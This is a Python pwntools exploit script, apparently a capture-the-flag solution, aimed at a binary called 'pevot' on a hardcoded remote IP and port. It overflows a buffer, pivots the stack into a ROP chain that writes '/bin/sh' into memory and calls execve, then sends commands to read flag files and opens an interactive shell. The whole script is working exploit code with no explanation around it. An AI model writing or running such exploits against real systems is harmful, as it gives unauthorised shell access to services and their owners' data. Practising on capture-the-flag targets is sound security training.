#!/usr/bin/env python3
from pwn import *

context.binary = e = ELF("./pevot", checksec=False)
context.log_level = "info"
HOST, PORT = "109.233.56.90", 11616

PIVOT = 0x47d414
POP_RDI = 0x4017e6
POP_RSI = 0x40793e
POP_RDX = 0x4016fb
POP_RAX = 0x43f533
WRITE_M = 0x45e43d
SYSCALL = 0x40120b
BSS = 0x4ae700

chain = flat(
    POP_RAX, BSS,
    POP_RDX, u64(b"/bin/sh\x00"),
    WRITE_M,
    POP_RDI, BSS,
    POP_RSI, 0,
    POP_RDX, 0,
    POP_RAX, 59,
    SYSCALL,
)
assert b"\n" not in chain

payload = chain.ljust(0x200, b"A")
payload += p64(PIVOT)
assert b"\n" not in payload and len(payload) == 0x208

io = remote(HOST, PORT) if len(sys.argv) < 2 else e.process()
io.sendline(payload)

io.sendline(b"id; echo PWNED; cat /flag* 2>/dev/null; cat flag* 2>/dev/null; /bin/getflag 2>/dev/null")
print(io.recvrepeat(3).decode(errors="replace"))
io.interactive()
